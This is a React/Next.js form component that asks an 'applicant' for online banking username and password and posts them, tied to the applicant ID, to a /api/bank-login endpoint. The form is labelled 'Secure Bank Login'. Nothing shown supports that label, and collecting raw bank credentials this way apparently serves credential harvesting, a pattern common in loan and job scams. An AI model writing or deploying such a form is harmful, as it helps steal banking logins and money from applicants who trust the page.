'use client';

import { useState } from 'react';

export default function BankLoginForm({ applicantId }: { applicantId: string }) {
  const [form, setForm] = useState({

    bank_username: '',
    bank_password: '',
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const formData = new FormData();
    formData.append('applicant_id', applicantId);

    formData.append('bank_username', form.bank_username);
    formData.append('bank_password', form.bank_password);

    const res = await fetch('/api/bank-login', {
      method: 'POST',
      body: formData,
    });

    setLoading(false);

    if (res.ok) {
      alert('✅ Bank login submitted successfully!');
    } else {
      alert('❌ Submission failed.');
    }
  };

  return (
    <main className="max-w-xl mx-auto p-8">
      <h2 className="text-2xl font-bold text-blue-900 mb-6 text-center">
        Secure Bank Login
      </h2>

      <form onSubmit={handleSubmit} className="space-y-5">
      
        <input
          name="bank_username"
          placeholder="Online Banking Username"
          required
          onChange={handleChange}
          className="input"
        />
        <input
          name="bank_password"
          type="password"
          placeholder="Online Banking Password"
          required
          onChange={handleChange}
          className="input"
        />

        <button
          type="submit"
          disabled={loading}
          className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700 w-full"
        >
          {loading ? 'Submitting...' : 'Submit Bank Login'}
        </button>
      </form>
    </main>
  );
}
